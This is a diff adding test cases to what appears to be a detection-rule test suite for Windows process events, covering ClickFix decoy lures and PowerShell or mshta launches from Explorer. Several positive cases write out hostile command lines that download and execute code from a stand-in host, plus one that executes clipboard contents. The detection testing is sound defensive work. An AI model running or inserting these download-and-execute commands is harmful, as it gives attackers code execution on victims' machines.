@@ -1711,6 +1711,94 @@ CASES = [
         False,
         event(1, image=r"C:\Windows\System32\whoami.exe", command_line="whoami"),
     ),
+    # --- ClickFix/FileFix decoy verification lure pasted from Explorer (SYS-151) ---
+    (
+        "SYS-151",
+        True,
+        event(
+            1,
+            parent_image=r"C:\Windows\explorer.exe",
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                r'powershell -w hidden -c "iwr http://evil.example/x.ps1|iex"'
+                "      # Verification ID: 4471-AXQ - I am not a robot, please wait..."
+            ),
+        ),
+    ),
+    (
+        "SYS-151",
+        False,
+        event(
+            1,
+            parent_image=r"C:\Windows\explorer.exe",
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell -File deploy.ps1",
+        ),
+    ),
+    # --- PowerShell from Explorer with bypass + hidden window (SYS-152) ---
+    (
+        "SYS-152",
+        True,
+        event(
+            1,
+            parent_image=r"C:\Windows\explorer.exe",
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                "powershell.exe -ep bypass -w hidden -c IEX(New-Object "
+                "Net.WebClient).DownloadString('http://evil.example/a.ps1')"
+            ),
+        ),
+    ),
+    (
+        "SYS-152",
+        False,
+        event(
+            1,
+            parent_image=r"C:\Windows\explorer.exe",
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell.exe -ep bypass -File deploy.ps1",
+        ),
+    ),
+    # --- Script host from Explorer immediately fetching remote code (SYS-153) ---
+    (
+        "SYS-153",
+        True,
+        event(
+            1,
+            parent_image=r"C:\Windows\explorer.exe",
+            image=r"C:\Windows\System32\mshta.exe",
+            command_line="mshta.exe http://evil.example/payload.hta",
+        ),
+    ),
+    (
+        "SYS-153",
+        False,
+        event(
+            1,
+            parent_image=r"C:\Windows\explorer.exe",
+            image=r"C:\Windows\System32\notepad.exe",
+            command_line=r"notepad.exe C:\Users\bob\notes.txt",
+        ),
+    ),
+    # --- PowerShell reads and executes clipboard contents (SYS-154) ---
+    (
+        "SYS-154",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line='powershell -c "iex (Get-Clipboard | Out-String)"',
+        ),
+    ),
+    (
+        "SYS-154",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell -c Get-Process",
+        ),
+    ),
 ]
 
 
